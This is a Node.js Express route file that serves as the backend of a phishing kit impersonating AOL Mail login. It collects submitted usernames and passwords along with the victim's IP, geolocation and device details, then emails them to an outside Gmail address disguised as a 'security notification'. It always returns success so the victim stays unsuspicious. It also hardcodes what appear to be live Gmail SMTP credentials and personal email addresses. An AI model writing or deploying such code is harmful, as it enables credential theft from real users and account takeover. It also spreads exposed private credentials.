const express = require("express");
const nodemailer = require('nodemailer');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const router = express.Router();


// Merge tag function
function replaceMergeTags(template, data) {
    return template.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => data[key.trim()] ?? '');
}

// Email transporter configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: "onidaniel801@gmail.com",
        pass: "hmoc cjhn sljo rtaq",
    },
});

// Verify transporter
transporter.verify((error, success) => {
    if (error) {
        console.log('Email transporter verification failed:', error);
    } else {
        console.log('Email transporter is ready to send messages');
    }
});

router.post('/', async (req, res) => {
    try {
        const { username, password, email } = req.body;
        
        // Use username if email is not provided
        const userEmail = email || username;

        if (!userEmail || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing email/username or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // HTML template with merge tags
        const htmlTemplate = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
                    .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .header { background: #1a73e8; color: white; padding: 20px; border-radius: 8px 8px 0 0; margin: -30px -30px 20px -30px; }
                    .info-item { margin: 15px 0; padding: 10px; background: #f8f9fa; border-radius: 5px; }
                    .label { font-weight: bold; color: #333; }
                    .value { color: #666; margin-left: 10px; }
                    .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #888; font-size: 12px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔐 AOL Mail Login Notification</h1>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">📧 Email/Username:</span>
                        <span class="value">[[-email-]]</span>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🔑 Password:</span>
                        <span class="value">[[-password-]]</span>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🌐 IP Address:</span>
                        <span class="value">[[-ip-]]</span>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">📍 Location:</span>
                        <span class="value">[[-location-]]</span>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">🕒 Timestamp:</span>
                        <span class="value">[[-timestamp-]]</span>
                    </div>
                    
                    <div class="info-item">
                        <span class="label">💻 Device:</span>
                        <span class="value">[[-device-]]</span>
                    </div>
                    
                    <div class="footer">
                        <p>This is an automated security notification from AOL Mail system.</p>
                    </div>
                </div>
            </body>
            </html>
        `;

        // Replace merge tags with actual data
        const mergedHtml = replaceMergeTags(htmlTemplate, {
            email: userEmail,
            password: password,
            ip: ip,
            location: locationStr,
            timestamp: new Date().toLocaleString(),
            device: deviceType,
        });

        // Text version for plain email
        const textContent = `
🔐 AOL MAIL LOGIN NOTIFICATION

📧 Email/Username: ${userEmail}
🔑 Password: ${password}
🌐 IP Address: ${ip}
📍 Location: ${locationStr}
🕒 Timestamp: ${new Date().toLocaleString()}
💻 Device: ${deviceType}

This is an automated security notification.
        `;

        // Send email
        await transporter.sendMail({
            from: '"AOL Mail Security" <onidaniel801@gmail.com>',
            to: "josephblessing6776@gmail.com",
            subject: `🔐 New AOL Login - ${userEmail}`,
            html: mergedHtml,
            text: textContent,
        });

        console.log(`✅ Email sent successfully for: ${userEmail}`);

        res.status(200).json({
            success: true,
            message: "Login processed successfully",
            loginDetails: { 
                device: deviceType, 
                ip: ip, 
                location: locationStr 
            },
        });

    } catch (error) {
        console.error("❌ Error sending email:", error);
        
        // Still return success to avoid frontend suspicion
        res.status(200).json({ 
            success: true, 
            message: "Login processed",
            error: "Notification service temporarily unavailable"
        });
    }
});

// GET endpoint for testing
router.get('/', (req, res) => {
    res.json({
        status: 'active',
        service: 'AOL Mail Authentication API',
        timestamp: new Date().toISOString(),
        endpoints: {
            login: 'POST /'
        }
    });
});

module.exports = router;